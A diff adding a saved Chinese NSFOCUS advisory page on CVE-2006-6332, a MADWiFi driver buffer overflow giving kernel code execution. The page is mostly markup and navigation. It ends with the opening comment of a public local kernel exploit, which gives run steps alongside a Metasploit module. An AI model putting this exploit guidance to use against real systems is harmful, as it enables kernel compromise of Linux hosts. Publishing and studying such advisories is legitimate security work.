@@ -1,0 +1,3596 @@
+From: <ÓÉ Windows Internet Explorer 7 ±£´æ>
+Subject: =?gb2312?B?wszDy7/GvLwtLXd3dy5uc2ZvY3VzLmNvbS0tsLLIq8KptrQgTUFEV2lGaSA=?=
+	=?gb2312?B?TGludXjE2rrLyeixuMf9tq/UtrPMu7qz5cf40uez9sKptrQ=?=
+Date: Mon, 19 Apr 2010 10:17:24 +0800
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	type="text/html";
+	boundary="----=_NextPart_000_0000_01CADFA9.810FE4D0"
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5579
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0000_01CADFA9.810FE4D0
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://www.nsfocus.net/vulndb/9644
+
+=EF=BB=BF<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" =
+"http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<HTML =
+xmlns=3D"http://www.w3.org/1999/xhtml"><HEAD><TITLE>=E7=BB=BF=E7=9B=9F=E7=
+=A7=91=E6=8A=80--www.nsfocus.com--=E5=AE=89=E5=85=A8=E6=BC=8F=E6=B4=9E =
+MADWiFi =
+Linux=E5=86=85=E6=A0=B8=E8=AE=BE=E5=A4=87=E9=A9=B1=E5=8A=A8=E8=BF=9C=E7=A8=
+=8B=E7=BC=93=E5=86=B2=E5=8C=BA=E6=BA=A2=E5=87=BA=E6=BC=8F=E6=B4=9E</TITLE=
+><LINK=20
+href=3D"http://www.nsfocus.net/css/main.css" type=3Dtext/css =
+rel=3Dstylesheet>
+<SCRIPT type=3Dtext/javascript>
+	var topLeftMenuNum =3D 4;
+	var currentTopLeftMenu =3D 0;
+	var currentTopSonLeftMenu =3D -1;
+	var startID =3D 4;
+</SCRIPT>
+
+<META http-equiv=3DContent-Type content=3D"text/html; charset=3DUTF-8">
+<META =
+content=3D"=E5=AE=89=E5=85=A8=E4=BA=A7=E5=93=81,=E9=98=B2=E7=81=AB=E5=A2=99=
+,=E5=85=A5=E4=BE=B5=E6=A3=80=E6=B5=8B,=E7=89=A9=E7=90=86=E9=9A=94=E7=A6=BB=
+,=E8=B7=AF=E7=94=B1=E5=99=A8,VPN=E8=AE=BE=E5=A4=87,=E5=8F=8D=E5=9E=83=E5=9C=
+=BE=E4=BA=A7=E5=93=81,=E7=BD=91=E7=BB=9C=E9=98=B2=E6=AF=92,=E5=AE=89=E5=85=
+=A8=E7=9B=91=E6=8E=A7=E8=BF=87=E6=BB=A4,=E5=8F=AF=E4=BF=A1=E8=AE=A1 =
+=E7=AE=97"=20
+name=3Ddescription>
+<META =
+content=3D=E5=AE=89=E5=85=A8=E4=BA=A7=E5=93=81=E9=A2=91=E9=81=93=EF=BC=8C=
+=E6=9C=80=E5=85=A8=E9=9D=A2=E7=9A=84=E4=B8=9A=E7=95=8C=E5=AE=89=E5=85=A8=E4=
+=BA=A7=E5=93=81,=E9=98=B2=E7=81=AB=E5=A2=99,=E5=85=A5=E4=BE=B5=E6=A3=80=E6=
+=B5=8B,=E7=89=A9=E7=90=86=E9=9A=94=E7=A6=BB,=E8=B7=AF=E7=94=B1=E5=99=A8,V=
+PN=E8=AE=BE=E5=A4=87,=E5=8F=8D=E5=9E=83=E5=9C=BE=E4=BA=A7=E5=93=81,=E7=BD=
+=91=E7=BB=9C=E9=98=B2=E6=AF=92,=E5=AE=89=E5=85=A8=E7=9B=91=E6=8E=A7=E8=BF=
+=87=E6=BB=A4,=E5=8F=AF=E4=BF=A1=E8=AE=A1=E7=AE=97=20
+name=3Dkeywords>
+<SCRIPT src=3D"http://www.nsfocus.net/js/topMenu.js"=20
+type=3Dtext/javascript></SCRIPT>
+<LINK href=3D"http://www.nsfocus.net/css/main.css" type=3Dtext/css=20
+rel=3Dstylesheet><LINK href=3D"http://www.nsfocus.net/css/botton.css" =
+type=3Dtext/css=20
+rel=3Dstylesheet>
+<SCRIPT src=3D"http://www.google-analytics.com/urchin.js" =
+type=3Dtext/javascript>
+</SCRIPT>
+
+<SCRIPT type=3Dtext/javascript>
+var host =3D window.location.host;
+if ("www.nsfocus.net" =3D=3D host) {
+	_uacct =3D "UA-1164308-2";
+} else {
+	_uacct =3D "UA-1164308-1";
+}
+urchinTracker();
+</SCRIPT>
+
+<SCRIPT src=3D"http://www.nsfocus.net/js/leftMenu.js"=20
+type=3Dtext/javascript></SCRIPT>
+
+<SCRIPT type=3Dtext/javascript>
+function initMain () {
+	InitMenu ();
+	InitLeftMenu();=20
+}
+
+function openChat(t) {
+	var url =3D =
+"http://chat.doyoo.net/WebModule/chat/p.do?c=3D13864&g=3D1346";
+	if(t!=3D null &&  t.length !=3D 0 ) url +=3D"&n=3D" + t;
+	var param =3D "height=3D460,width=3D690,directories=3Dno," + =
+"location=3Dno,menubar=3Dno," + =
+"resizeable=3Dno,status=3Dno,toolbar=3Dno,top=3D100,left=3D200";
+=09
+	var acceptWin =3D window.open(url,"", param);
+}
+</SCRIPT>
+
+<SCRIPT language=3Djavascript=20
+src=3D"http://js.doyoo.net/j.jsp?c=3D13864&amp;f=3D32413"></SCRIPT>
+
+<META content=3D"MSHTML 6.00.6000.17023" name=3DGENERATOR></HEAD>
+<BODY topMargin=3D0 onload=3DinitMain()><A name=3Dgo_top></A>
+<TABLE height=3D59 cellSpacing=3D0 cellPadding=3D0 width=3D780 =
+align=3Dcenter=20
+background=3Dhttp://www.nsfocus.net/images/top_nav/top_bg.gif =
+border=3D0>
+  <TBODY>
+  <TR height=3D59>
+    <TD vAlign=3Dtop width=3D183><A =
+href=3D"http://www.nsfocus.com/"><IMG height=3D59=20
+      alt=3D"Logo of NSFOCUS" =
+src=3D"http://www.nsfocus.net/images/top_nav/logo.gif"=20
+      width=3D183 border=3D0></A> </TD>
+    <TD vAlign=3Dtop width=3D46>
+      <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+        <TBODY>
+        <TR>
+          <TD colSpan=3D3 height=3D5></TD></TR>
+        <TR>
+          <TD><A href=3D"http://www.nsfocus.com/en/"><IMG height=3D14=20
+            alt=3D"English Version"=20
+            src=3D"http://www.nsfocus.com/jp/images/top_nav/en_off.gif" =
+width=3D44=20
+            border=3D0></A></TD>
+          <TD width=3D1></TD>
+          <TD><A href=3D"http://www.nsfocus.com/"><IMG height=3D14=20
+            alt=3D"Chinese Version"=20
+            src=3D"http://www.nsfocus.com/jp/images/top_nav/cn_on.gif" =
+width=3D32=20
+            border=3D0></A></TD>
+          <TD width=3D1></TD>
+          <TD><A href=3D"http://www.nsfocus.com/jp/"><IMG height=3D14=20
+            alt=3D"Japanese Version"=20
+            src=3D"http://www.nsfocus.com/jp/images/top_nav/jp_off.gif" =
+width=3D38=20
+            border=3D0></A></TD></TR></TBODY></TABLE></TD>
+    <TD width=3D551><!--<table width=3D"100%" height=3D"59" border=3D"0" =
+cellpadding=3D"0" cellspacing=3D"0">
+	  <tr>
+		<td width=3D"257"></td>
+		<td valign=3D"middle">
+		<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" =
+bgcolor=3D"#F2F2F2" class=3D"border_white">
+		<form action=3D"http://www.nsfocus.net/search.php" method=3D"get">
+          <tr>
+            <td><img src=3D"/images/top_nav/search_txt.gif" width=3D"38" =
+height=3D"23"></td>
+            <td><table width=3D"100%" border=3D"0" cellspacing=3D"0" =
+cellpadding=3D"0">
+                <tr>
+                  <td height=3D"2"></td>
+                </tr>
+                <tr>
+                  <td><input name=3D"q" type=3D"text" class=3D"normal" =
+/></td>
+                </tr>
+                <tr>
+                  <td height=3D"2"></td>
+                </tr>
+            </table></td>
+            <td><label>
+              <input name=3D"s" type=3D"submit" class=3D"button_search" =
+value=3D"  ">
+            </label></td>
+          </tr>
+		</form>
+        </table>
+		</td>
+	  </tr>
+	</table>
+	--></TD></TR></TBODY></TABLE>
+<TABLE height=3D2 cellSpacing=3D0 cellPadding=3D0 width=3D780 =
+align=3Dcenter border=3D0>
+  <TBODY>
+  <TR>
+    <TD vAlign=3Dtop width=3D183 height=3D2><IMG height=3D2=20
+      src=3D"http://www.nsfocus.net/images/top_nav/top_dash_left.gif" =
+width=3D183=20
+      border=3D0></TD>
+    <TD vAlign=3Dtop width=3D597=20
+    =
+background=3Dhttp://www.nsfocus.net/images/top_nav/top_dash_right.gif=20
+    height=3D2></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D780 align=3Dcenter =
+border=3D0>
+  <TBODY>
+  <TR>
+    <TD class=3Dnavtd><A href=3D"http://www.nsfocus.com/"><IMG =
+id=3Dmenu0=20
+      onclick=3DreturnMain(); height=3D23=20
+      src=3D"http://www.nsfocus.net/images/top_nav/topNav_left_bg.gif" =
+width=3D183=20
+      border=3D0></A> </TD>
+    <TD class=3Dnavtd><A=20
+      =
+onmouseover=3D"document.menu1.src=3D'/images/top_nav/topNav_1_on.gif'"=20
+      onclick=3D"navchange('/images/top_nav/topNav_1_on.gif','menu1');"=20
+      =
+onmouseout=3D"checkChange('/images/top_nav/topNav_1_off.gif','menu1')"=20
+      href=3D"http://www.nsfocus.com/1_solution/"><IMG id=3Dmenu1/ =
+height=3D23=20
+      =
+alt=3D=E4=BA=A7=E5=93=81=E4=B8=8E=E8=A7=A3=E5=86=B3=E6=96=B9=E6=A1=88 =
+src=3D"http://www.nsfocus.net/images/top_nav/topNav_1_off.gif"=20
+      width=3D128 border=3D0 name=3Dmenu1></A> </TD>
+    <TD class=3Dnavtd><A=20
+      =
+onmouseover=3D"document.menu2.src=3D'/images/top_nav/topNav_2_on.gif'"=20
+      onclick=3D"navchange('/images/top_nav/topNav_2_on.gif','menu2');"=20
+      =
+onmouseout=3D"checkChange('/images/top_nav/topNav_2_off.gif','menu2')"=20
+      href=3D"http://www.nsfocus.com/2_services/"><IMG id=3Dmenu2/ =
+height=3D23=20
+      alt=3D=E4=B8=93=E4=B8=9A=E6=9C=8D=E5=8A=A1 =
+src=3D"http://www.nsfocus.net/images/top_nav/topNav_2_off.gif"=20
+      width=3D92 border=3D0 name=3Dmenu2></A> </TD>
+    <TD class=3Dnavtd><A=20
+      =
+onmouseover=3D"document.menu3.src=3D'/images/top_nav/topNav_3_on.gif'"=20
+      onclick=3D"navchange('/images/top_nav/topNav_3_on.gif','menu3');"=20
+      =
+onmouseout=3D"checkChange('/images/top_nav/topNav_3_off.gif','menu3')"=20
+      href=3D"http://support.nsfocus.com/"><IMG id=3Dmenu3/ height=3D23 =
+alt=3D=E5=AE=A2=E6=88=B7=E6=94=AF=E6=8C=81=20
+      src=3D"http://www.nsfocus.net/images/top_nav/topNav_3_off.gif" =
+width=3D92=20
+      border=3D0 name=3Dmenu3></A> </TD>
+    <TD class=3Dnavtd><A=20
+      =
+onmouseover=3D"document.menu4.src=3D'/images/top_nav/topNav_4_on.gif'"=20
+      onclick=3D"navchange('/images/top_nav/topNav_4_on.gif','menu4');"=20
+      =
+onmouseout=3D"checkChange('/images/top_nav/topNav_4_off.gif','menu4')"=20
+      href=3D"http://www.nsfocus.net/"><IMG id=3Dmenu4/ height=3D23 =
+alt=3D=E5=AE=89=E5=85=A8=E7=A0=94=E7=A9=B6=20
+      src=3D"http://www.nsfocus.net/images/top_nav/topNav_4_off.gif" =
+width=3D91=20
+      border=3D0 name=3Dmenu4></A> </TD>
+    <TD class=3Dnavtd><A=20
+      =
+onmouseover=3D"document.menu5.src=3D'/images/top_nav/topNav_5_on.gif'"=20
+      onclick=3D"navchange('/images/top_nav/topNav_5_on.gif','menu5');"=20
+      =
+onmouseout=3D"checkChange('/images/top_nav/topNav_5_off.gif','menu5')"=20
+      href=3D"http://www.nsfocus.com/5_careers/"><IMG id=3Dmenu5/ =
+height=3D23 alt=3D=E5=B7=A5=E4=BD=9C=E6=9C=BA=E4=BC=9A=20
+      src=3D"http://www.nsfocus.net/images/top_nav/topNav_5_off.gif" =
+width=3D92=20
+      border=3D0 name=3Dmenu5></A> </TD>
+    <TD class=3Dnavtd><A=20
+      =
+onmouseover=3D"document.menu6.src=3D'/images/top_nav/topNav_6_on.gif'"=20
+      onclick=3D"navchange('/images/top_nav/topNav_6_on.gif','menu6');"=20
+      =
+onmouseout=3D"checkChange('/images/top_nav/topNav_6_off.gif','menu6')"=20
+      href=3D"http://www.nsfocus.com/6_about/"><IMG id=3Dmenu6/ =
+height=3D23 alt=3D=E5=85=B3=E4=BA=8E=E6=88=91=E4=BB=AC=20
+      src=3D"http://www.nsfocus.net/images/top_nav/topNav_6_off.gif" =
+width=3D91=20
+      border=3D0 name=3Dmenu6></A> </TD>
+    <TD class=3Dnavtd><IMG height=3D23=20
+      src=3D"http://www.nsfocus.net/images/top_nav/topNav_right_bg.gif" =
+width=3D11=20
+      =
+border=3D0></TD></TR></TBODY></TABLE><!--=E4=B8=AD=E9=97=B4=E9=83=A8=E5=88=
+=86-->
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D780 align=3Dcenter =
+border=3D0>
+  <TBODY>
+  <TR>
+    <TD height=3D1></TD></TR></TBODY></TABLE>
+<TABLE height=3D"100%" cellSpacing=3D0 cellPadding=3D0 width=3D780 =
+align=3Dcenter=20
+border=3D0>
+  <TBODY>
+  <TR>
+    <TD vAlign=3Dtop width=3D184 bgColor=3D#eaebeb height=3D"100%">
+      <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D184 border=3D0>
+        <TBODY>
+        <TR>
+          <TD vAlign=3Dtop>
+            <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D184 =
+border=3D0>
+              <TBODY>
+              <TR>
+                <TD height=3D25><IMG=20
+                  =
+src=3D"http://www.nsfocus.net/images/left_nav/left_03.gif"></TD></TR><!--=
+=E8=8F=9C=E5=8D=951-->
+              <TR style=3D"CURSOR: pointer"=20
+              onclick=3D"FirstLeftMenu('LeftMenu_1', 'LeftMenu_1_son', =
+'http://www.nsfocus.net/index.php?act=3Dsec_bug')">
+                <TD class=3DleftLeftMenuText id=3DLeftMenu_1 =
+align=3Dleft=20
+                =
+background=3Dhttp://www.nsfocus.net/images/left_nav/left_12.gif=20
+                height=3D24><A style=3D"MARGIN-LEFT: 15px"=20
+                  =
+href=3D"http://www.nsfocus.net/index.php?act=3Dsec_bug">=E5=AE=89=E5=85=A8=
+=E6=BC=8F=E6=B4=9E</A></TD></TR>
+              <TR id=3DLeftMenu_1_son style=3D"DISPLAY: none; CURSOR: =
+pointer"></TR><!--=E8=8F=9C=E5=8D=951END--><!--=E8=8F=9C=E5=8D=952-->
+              <TR style=3D"CURSOR: pointer"=20
+              onclick=3D"FirstLeftMenu('LeftMenu_2', 'LeftMenu_2_son', =
+'http://www.nsfocus.net/index.php?act=3Dsec_news')">
+                <TD class=3DleftLeftMenuText id=3DLeftMenu_2 =
+align=3Dleft=20
+                =
+background=3Dhttp://www.nsfocus.net/images/left_nav/left_12.gif=20
+                height=3D24><A style=3D"MARGIN-LEFT: 15px"=20
+                  =
+href=3D"http://www.nsfocus.net/index.php?act=3Dsec_news">=E4=B8=9A=E7=95=8C=
+=E5=8A=A8=E6=80=81</A></TD></TR>
+              <TR id=3DLeftMenu_2_son style=3D"DISPLAY: none; CURSOR: =
+pointer"></TR><!--=E8=8F=9C=E5=8D=952END--><!--=E8=8F=9C=E5=8D=953-->
+              <TR style=3D"CURSOR: pointer"=20
+              onclick=3D"FirstLeftMenu('LeftMenu_3', 'LeftMenu_3_son', =
+'http://www.nsfocus.net/index.php?act=3Dalert')">
+                <TD class=3DleftLeftMenuText id=3DLeftMenu_3 =
+align=3Dleft=20
+                =
+background=3Dhttp://www.nsfocus.net/images/left_nav/left_12.gif=20
+                height=3D24><A style=3D"MARGIN-LEFT: 15px"=20
+                  =
+href=3D"http://www.nsfocus.net/index.php?act=3Dalert">=E7=B4=A7=E6=80=A5=E9=
+=80=9A=E5=91=8A</A></TD></TR>
+              <TR id=3DLeftMenu_3_son style=3D"DISPLAY: none; CURSOR: =
+pointer"></TR><!--=E8=8F=9C=E5=8D=953END--><!--=E8=8F=9C=E5=8D=954-->
+              <TR style=3D"CURSOR: pointer"=20
+              onclick=3D"FirstLeftMenu('LeftMenu_4', 'LeftMenu_4_son', =
+'http://www.nsfocus.net/index.php?act=3Dadvisory')">
+                <TD class=3DleftLeftMenuText id=3DLeftMenu_4 =
+align=3Dleft=20
+                =
+background=3Dhttp://www.nsfocus.net/images/left_nav/left_12.gif=20
+                height=3D24><A style=3D"MARGIN-LEFT: 15px"=20
+                  =
+href=3D"http://www.nsfocus.net/index.php?act=3Dadvisory">=E7=A0=94=E7=A9=B6=
+=E6=88=90=E6=9E=9C</A></TD></TR>
+              <TR id=3DLeftMenu_4_son style=3D"DISPLAY: none; CURSOR: =
+pointer"></TR><!--=E8=8F=9C=E5=8D=954END--><!--=E8=8F=9C=E5=8D=955-->
+              <TR style=3D"CURSOR: pointer"=20
+              onclick=3D"FirstLeftMenu('LeftMenu_5', 'LeftMenu_5_son', =
+'http://www.nsfocus.com/4_research/4_5.html')">
+                <TD class=3DleftLeftMenuText id=3DLeftMenu_5 =
+align=3Dleft=20
+                =
+background=3Dhttp://www.nsfocus.net/images/left_nav/left_12.gif=20
+                height=3D24><A style=3D"MARGIN-LEFT: 15px"=20
+                  =
+href=3D"http://www.nsfocus.com/4_research/4_5.html">=E7=A0=94=E7=A9=B6=E6=
+=9C=BA=E6=9E=84</A></TD></TR>
+              <TR id=3DLeftMenu_5_son style=3D"DISPLAY: none; CURSOR: =
+pointer"></TR><!--=E8=8F=9C=E5=8D=955END--></TBODY></TABLE></TD></TR>
+        <TR>
+          <TD bgColor=3D#ffffff =
+height=3D1></TD></TR></TBODY></TABLE></TD><!--End-->
+    <TD vAlign=3Dtop><!--=E5=8F=B3=E8=BE=B9=E6=AD=A3=E6=96=87-->
+      <TABLE height=3D"100%" cellSpacing=3D0 cellPadding=3D0 width=3D596 =
+border=3D0>
+        <TBODY>
+        <TR>
+          <TD vAlign=3Dtop width=3D596><!-- Bug Search Form -->
+            <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D596 =
+border=3D0>
+              <TBODY>
+              <TR>
+                <TD height=3D10><IMG=20
+                  =
+src=3D"http://www.nsfocus.net/images/top_nav_shadow.gif"></TD></TR>
+              <TR>
+                <TD height=3D47><IMG style=3D"MARGIN-LEFT: 8px" =
+height=3D47=20
+                  =
+src=3D"http://www.nsfocus.net/images/4_research/4_1_pic_1.gif"=20
+                  width=3D171></TD></TR></TBODY></TABLE>
+            <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" =
+border=3D0>
+              <TBODY>
+              <TR>
+                <TD style=3D"PADDING-LEFT: 8px">
+                  <TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" =
+border=3D0>
+                    <TBODY>
+                    <TR>
+                      <TD bgColor=3D#c3d7da height=3D1></TD></TR>
+                    <TR align=3Dmiddle>
+                      <TD>&nbsp;</TD></TR>
+                    <TR align=3Dmiddle>
+                      <TD align=3Dright bgColor=3D#f2f2f2>
+                        <TABLE cellSpacing=3D0 cellPadding=3D0 =
+bgColor=3D#f2f2f2=20
+                        border=3D0>
+                          <FORM action=3D/index.php>
+                          <TBODY>
+                          <TR>
+                            <TD=20
+                              style=3D"PADDING-RIGHT: 2px; PADDING-LEFT: =
+2px"><SELECT=20
+                              name=3Dos> <OPTION value=3D"" =
+selected>=E6=89=80=E6=9C=89=E7=B3=BB=E7=BB=9F</OPTION>=20
+                                <OPTION value=3DAIX>AIX</OPTION> <OPTION =
+
+                                value=3DBSD>BSD(eg,OpenBSD)</OPTION> =
+<OPTION=20
+                                value=3DDigital>Digital Unix</OPTION> =
+<OPTION=20
+                                value=3DHP-UX>HP-UX</OPTION> <OPTION=20
+                                value=3DIRIX>IRIX</OPTION> <OPTION=20
+                                value=3DLinux>Linux</OPTION> <OPTION=20
+                                value=3DFreeBSD>FreeBSD</OPTION> <OPTION =
+
+                                value=3DSCO>SCO UNIX</OPTION> <OPTION=20
+                                value=3DSunOS>SunOS</OPTION> <OPTION=20
+                                value=3DSolaris>Solaris</OPTION> <OPTION =
+
+                                =
+value=3DMicrosoft>Windows</OPTION></SELECT> </TD>
+                            <TD=20
+                              style=3D"PADDING-RIGHT: 2px; PADDING-LEFT: =
+2px"><SELECT=20
+                              name=3Dtype_id> <OPTION value=3D""=20
+                                =
+selected>=E6=89=80=E6=9C=89=E7=B1=BB=E5=9E=8B</OPTION> <OPTION=20
+                                =
+value=3D1>=E8=BF=9C=E7=A8=8B=E8=BF=9B=E5=85=A5=E7=B3=BB=E7=BB=9F</OPTION>=
+ <OPTION=20
+                                =
+value=3D2>=E6=9C=AC=E5=9C=B0=E8=B6=8A=E6=9D=83=E8=AE=BF=E9=97=AE</OPTION>=
+ <OPTION=20
+                                =
+value=3D3>=E6=8B=92=E7=BB=9D=E6=9C=8D=E5=8A=A1=E6=94=BB=E5=87=BB</OPTION>=
+ <OPTION=20
+                                =
+value=3D4>=E5=B5=8C=E5=85=A5=E6=81=B6=E6=84=8F=E4=BB=A3=E7=A0=81</OPTION>=
+ <OPTION=20
+                                =
+value=3D5>Web=E6=95=B0=E6=8D=AE=E6=8E=A5=E5=8F=A3</OPTION> <OPTION=20
+                                =
+value=3D6>=E5=85=B6=E4=BB=96=E7=B1=BB=E5=9E=8B</OPTION></SELECT> </TD>
+                            <TD=20
+                              style=3D"PADDING-RIGHT: 2px; PADDING-LEFT: =
+2px"><INPUT=20
+                              class=3Dnormal size=3D15 name=3Dkeyword> =
+<INPUT=20
+                              type=3Dhidden value=3Dsec_bug name=3Dact> =
+</TD>
+                            <TD><INPUT class=3Dbutton_search =
+type=3Dsubmit value=3D" " name=3Dsubmit>=20
+                            =
+</TD></TR></FORM></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TB=
+ODY></TABLE><!-- bugList -->
+            <TABLE class=3DbodyText cellSpacing=3D0 cellPadding=3D0 =
+border=3D0>
+              <TBODY>
+              <TR>
+                <TD height=3D10></TD></TR>
+              <TR>
+                <TD style=3D"PADDING-LEFT: 20px; WORD-BREAK: break-all">
+                  <DIV align=3Dcenter><B>MADWiFi=20
+                  =
+Linux=E5=86=85=E6=A0=B8=E8=AE=BE=E5=A4=87=E9=A9=B1=E5=8A=A8=E8=BF=9C=E7=A8=
+=8B=E7=BC=93=E5=86=B2=E5=8C=BA=E6=BA=A2=E5=87=BA=E6=BC=8F=E6=B4=9E</B></D=
+IV><BR><B>=E5=8F=91=E5=B8=83=E6=97=A5=E6=9C=9F=EF=BC=9A</B>2006-12-07<BR>=
+<B>=E6=9B=B4=E6=96=B0=E6=97=A5=E6=9C=9F=EF=BC=9A</B>2006-12-11<BR><BR><B>=
+=E5=8F=97=E5=BD=B1=E5=93=8D=E7=B3=BB=E7=BB=9F=EF=BC=9A</B>
+                  <BLOCKQUOTE>MADWifi MADWifi =
+0.9.2</BLOCKQUOTE><B>=E4=B8=8D=E5=8F=97=E5=BD=B1=E5=93=8D=E7=B3=BB=E7=BB=9F=
+=EF=BC=9A</B>
+                  <BLOCKQUOTE>MADWifi MADWifi =
+0.9.2.1</BLOCKQUOTE><B>=E6=8F=8F=E8=BF=B0=EF=BC=9A</B>
+                  <HR>
+                  BUGTRAQ&nbsp;&nbsp;ID: <A=20
+                  href=3D"http://www.securityfocus.com/bid/21486"=20
+                  target=3D_blank>21486</A><BR>CVE(CAN) ID: <A=20
+                  =
+href=3D"http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2006-6332=
+"=20
+                  =
+target=3D_blank>CVE-2006-6332</A><BR><BR>MadWifi=E5=85=A8=E7=A7=B0=E6=98=AF=
+Multiband=20
+                  Atheros Driver for=20
+                  =
+Wifi=EF=BC=8C=E6=98=AF=E4=BD=BF=E7=94=A8Atheros=E7=B3=BB=E5=88=97=E8=8A=AF=
+=E7=89=87=E7=9A=84802.11a/b/g=E6=97=A0=E7=BA=BF=E7=BD=91=E5=8D=A1=E5=9C=A8=
+Linux=E4=B8=8B=E9=A9=B1=E5=8A=A8=E7=A8=8B=E5=BA=8F=E3=80=82<BR><BR>MadWif=
+i=E9=A9=B1=E5=8A=A8=E7=9A=84=E5=AE=9E=E7=8E=B0=E4=B8=8A=E5=AD=98=E5=9C=A8=
+=E7=BC=93=E5=86=B2=E5=8C=BA=E6=BA=A2=E5=87=BA=E6=BC=8F=E6=B4=9E=EF=BC=8C=E8=
+=BF=9C=E7=A8=8B=E6=94=BB=E5=87=BB=E8=80=85=E5=8F=AF=E8=83=BD=E5=88=A9=E7=94=
+=A8=E6=AD=A4=E6=BC=8F=E6=B4=9E=E4=BB=A5=E5=86=85=E6=A0=B8=E6=9D=83=E9=99=90=
+=E6=89=A7=E8=A1=8C=E4=BB=BB=E6=84=8F=E6=8C=87=E4=BB=A4=E3=80=82<BR><BR>Ma=
+dWifi=E9=A9=B1=E5=8A=A8=E4=BB=A3=E7=A0=81=E7=9A=84net80211/ieee80211_wire=
+less.c=E6=96=87=E4=BB=B6=E4=B8=AD=E5=AD=98=E5=9C=A8=E6=A0=88=E6=BA=A2=E5=87=
+=BA=E6=BC=8F=E6=B4=9E=EF=BC=8C=E6=94=BB=E5=87=BB=E8=80=85=E5=8F=AF=E4=BB=A5=
+=E9=80=9A=E8=BF=87encode_ie=E5=92=8Cgiwscan_cb=E5=87=BD=E6=95=B0=E8=A7=A6=
+=E5=8F=91=E8=BF=99=E4=B8=AA=E6=BA=A2=E5=87=BA=EF=BC=8C=E5=AF=BC=E8=87=B4=E6=
+=89=A7=E8=A1=8C=E4=BB=BB=E6=84=8F=E5=86=85=E6=A0=B8=E6=9D=83=E9=99=90=E6=8C=
+=87=E4=BB=A4=E3=80=82<BR><BR>&lt;*=E6=9D=A5=E6=BA=90=EF=BC=9ALaurent=20
+                  Butti =EF=BC=88<A=20
+                  =
+href=3D"mailto:laurent.butti@orange-ftgroup.com">laurent.butti@orange-ftg=
+roup.com</A>=EF=BC=89<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+Julien=20
+                  =
+Tinnes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Jerome=20
+                  =
+Raznieski<BR>&nbsp;&nbsp;<BR>&nbsp;&nbsp;=E9=93=BE=E6=8E=A5=EF=BC=9A<A=20
+                  href=3D"http://secunia.com/advisories/23277/"=20
+                  =
+target=3D_blank>http://secunia.com/advisories/23277/</A><BR>&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<A=20
+                  =
+href=3D"http://madwifi.org/wiki/news/20061207/release-0-9-2-1-fixes-criti=
+cal-security-issue"=20
+                  =
+target=3D_blank>http://madwifi.org/wiki/news/20061207/release-0-9-2-1-fix=
+es-critical-security-issue</A><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;<A=20
+                  href=3D"http://madwifi.org/changeset/1842"=20
+                  =
+target=3D_blank>http://madwifi.org/changeset/1842</A><BR>&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<A=20
+                  =
+href=3D"http://security.gentoo.org/glsa/glsa-200612-09.xml"=20
+                  =
+target=3D_blank>http://security.gentoo.org/glsa/glsa-200612-09.xml</A><BR=
+>*&gt;<BR><BR><B>=E6=B5=8B=E8=AF=95=E6=96=B9=E6=B3=95=EF=BC=9A</B>
+                  <HR>
+                  <FONT color=3D#ff0000>
+                  <P align=3Dcenter>=E8=AD=A6=20
+                  =
+=E5=91=8A<BR><BR>=E4=BB=A5=E4=B8=8B=E7=A8=8B=E5=BA=8F(=E6=96=B9=E6=B3=95)=
+=E5=8F=AF=E8=83=BD=E5=B8=A6=E6=9C=89=E6=94=BB=E5=87=BB=E6=80=A7=EF=BC=8C=E4=
+=BB=85=E4=BE=9B=E5=AE=89=E5=85=A8=E7=A0=94=E7=A9=B6=E4=B8=8E=E6=95=99=E5=AD=
+=A6=E4=B9=8B=E7=94=A8=E3=80=82=E4=BD=BF=E7=94=A8=E8=80=85=E9=A3=8E=E9=99=A9=
+=E8=87=AA=E8=B4=9F=EF=BC=81</P></FONT>/*=20
+                  Madwifi giwscan_cb buffer overflow local kernel=20
+                  exploit<BR>*<BR>* CVE-2006-6332<BR>*<BR>* (C) 2006 =
+Julien=20
+                  TINNES and Laurent BUTTI<BR>*<BR>* Use this local =
+exploit in=20
+                  conjonction with the metasploit module<BR>*<BR>* The=20
+                  vulnerable function is called when asking for scan =
+result=20
+                  (which you can do<BR>*&nbsp;&nbsp;without privileges). =
+
+                  <BR>*&nbsp;&nbsp;However you need to wait for your =
+card to=20
+                  scan for access point before this exploit can be=20
+                  successfull.<BR>*<BR>* The best way to test this =
+exploit=20
+                  is:<BR>* 1. start the metasploit module on another=20
+                  machine<BR>* 2. Bring your card up. (e.g. ifconfig =
+ath0=20
+                  up)<BR>* 3. ./madexploit<BR>*<BR>* This will always =
+work=20
+                  because the card will automatically start scanning for =
+APs=20
+                  when your<BR>* bring it up.<BR>* For testing purpose =
+you can=20
+                  also launch this exploit as root, It'll automatically =
+issue=20
+                  a<BR>* scanning request.<BR>* There are also ways to =
+remotely=20
+                  make the card start scanning for APs. Will you find =
+them=20
+                  ?<BR>*<BR>* Use -s if your kernel uses 4K stacks<BR>* =
+Use '-c=20
+                  madexploit' if you get a segfault (actually a BUG()) =
+after a=20
+                  "Success" message<BR>*<BR>* This was tested on Ubuntu =
+6.10,=20
+                  Knoppix 5.0.1 (madwifi 0.9.x) and Debian =
